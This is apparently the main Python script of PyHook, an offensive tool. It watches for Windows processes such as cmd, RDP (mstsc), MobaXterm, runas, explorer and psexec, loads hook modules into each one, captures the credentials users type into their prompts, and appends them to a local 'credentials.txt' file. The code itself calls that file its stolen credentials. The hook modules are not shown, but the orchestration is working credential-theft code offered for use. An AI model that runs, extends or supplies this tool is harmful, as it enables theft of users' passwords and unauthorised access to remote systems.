# Author: Ilan Kalendarov, Twitter: @IKalendarov
# Contributors: NirLevy98, LXTreato
# License: BSD 3-Clause


from __future__ import print_function

import importlib
from argparse import ArgumentParser, RawTextHelpFormatter
from multiprocessing.pool import ThreadPool
from typing import List
from time import sleep
import psutil
import re


example_text = '''example:

python PyHook.py [-cmxrep]

-c, --cmd          enable cmd hook.
-m, --mstsc        enable mstsc hook.
-x, --xterm        enable mobaxterm hook.
-r, --runas        enable runas hook.
-e, --explorer     enable explorer hook.
-p, --psexec       enable psexec hook.

No flags           enable all hooks'''


def parse_args():
    parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
    parser.add_argument('-c', '--cmd', action='store_true')
    parser.add_argument('-r', '--rdp', action='store_true')
    parser.add_argument('-x', '--mobaxterm', action='store_true')
    parser.add_argument('-ru', '--runas', action='store_true')
    parser.add_argument('-e', '--explorer', action='store_true')
    parser.add_argument('-p', '--psexec', action='store_true')
    args = vars(parser.parse_args())
    if not any(args.values()):
        for module in args.keys():
            args[module] = True
    return args


def get_selected_hooks():
    modules = []
    for hook_process_name, hook_enabled in parse_args().items():
        if hook_enabled:
            try:
                hook_module = importlib.import_module(f"hooks.{hook_process_name}")
                modules.append(hook_module.wait_for)
            except ModuleNotFoundError:
                print(f"[-] A module for the selected process is not available - {hook_process_name}")
    return modules


def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
    process_list = list()
    for p in psutil.process_iter(attrs=["name", "exe", "cmdline"]):
        if p.info['name'] in name_list:
            process_list.append(p)
    return process_list


def get_process_by_name(name: str) -> List[psutil.Process]:
    return get_process_by_list_names([name])


def run_thread_pool_for_functions(functions: list):
    pool = ThreadPool(len(functions))
    for function in functions:
        pool.apply_async(function)
    pool.close()
    pool.join()


def wait_for_process(process_name, tag_name, hook_function):
    running_pids = []

    while True:
        processes_alive = get_process_by_list_names(process_name)
        for process in processes_alive:
            if process.pid not in running_pids:
                running_pids.append(process.pid)
                print(f"[+] Found {tag_name} Window")
                hook_function(process.pid)

        running_pids = list(filter(psutil.pid_exists, running_pids))
        sleep(0.5)


def on_credential_submit(message, data):
    print(f"[+] Got message from hooked process:")
    print(message)
    if message['type'] == "send":
        credential_dump = message["payload"]
        hooked_program = re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump) \
                                    .groups("hooked_program")[0]

        print(f"[+] Parsed credentials submitted to {hooked_program} prompt:")
        print(credential_dump)
        with open("credentials.txt", "a") as stolen_credentials_file:
            stolen_credentials_file.write(credential_dump + '\n')


def main():
    functions = get_selected_hooks()
    run_thread_pool_for_functions(functions)


if __name__ == "__main__":
    main()
